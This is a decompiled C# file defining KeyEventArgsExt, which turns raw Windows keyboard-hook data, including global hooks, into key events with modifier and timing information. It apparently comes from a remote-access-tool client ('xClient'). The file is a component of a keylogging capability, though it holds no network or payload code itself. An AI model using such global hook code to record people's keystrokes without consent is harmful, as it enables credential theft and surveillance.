using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using xClient.Core.MouseKeyHook.WinApi;

namespace xClient.Core.MouseKeyHook;

public class KeyEventArgsExt : KeyEventArgs
{
	public int Timestamp { get; private set; }

	public bool IsKeyDown { get; private set; }

	public bool IsKeyUp { get; private set; }

	public KeyEventArgsExt(Keys keyData)
		: base(keyData)
	{
	}//IL_0001: Unknown result type (might be due to invalid IL or missing references)


	internal KeyEventArgsExt(Keys keyData, int timestamp, bool isKeyDown, bool isKeyUp)
		: this(keyData)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		Timestamp = timestamp;
		IsKeyDown = isKeyDown;
		IsKeyUp = isKeyUp;
	}

	internal static KeyEventArgsExt FromRawDataApp(CallbackData data)
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		IntPtr wParam = data.WParam;
		IntPtr lParam = data.LParam;
		int tickCount = Environment.TickCount;
		int num = (int)lParam.ToInt64();
		bool flag = (num & 0x40000000) != 0;
		bool flag2 = (num & int.MinValue) != 0;
		Keys keyData = AppendModifierStates((Keys)(int)wParam);
		bool isKeyDown = !flag && !flag2;
		bool isKeyUp = flag && flag2;
		return new KeyEventArgsExt(keyData, tickCount, isKeyDown, isKeyUp);
	}

	internal static KeyEventArgsExt FromRawDataGlobal(CallbackData data)
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		IntPtr wParam = data.WParam;
		KeyboardHookStruct keyboardHookStruct = (KeyboardHookStruct)Marshal.PtrToStructure(data.LParam, typeof(KeyboardHookStruct));
		Keys keyData = AppendModifierStates((Keys)keyboardHookStruct.VirtualKeyCode);
		int num = (int)wParam;
		bool isKeyDown = num == 256 || num == 260;
		bool isKeyUp = num == 257 || num == 261;
		return new KeyEventArgsExt(keyData, keyboardHookStruct.Time, isKeyDown, isKeyUp);
	}

	private static bool CheckModifier(int vKey)
	{
		return (KeyboardNativeMethods.GetKeyState(vKey) & 0x8000) > 0;
	}

	private static Keys AppendModifierStates(Keys keyData)
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		bool flag = CheckModifier(17);
		bool flag2 = CheckModifier(16);
		bool flag3 = CheckModifier(18);
		return (Keys)(keyData | (flag ? 131072 : 0) | (flag2 ? 65536 : 0) | (flag3 ? 262144 : 0));
	}
}
